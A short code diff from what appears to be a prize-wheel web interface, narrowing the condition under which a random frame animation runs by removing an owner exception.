-                    if (!isSpinning && (!userPrize || isOwner)) {
+                    if (!isSpinning && !userPrize) {
                         animateFrameRandomly();
                     }
                 }, 2000);
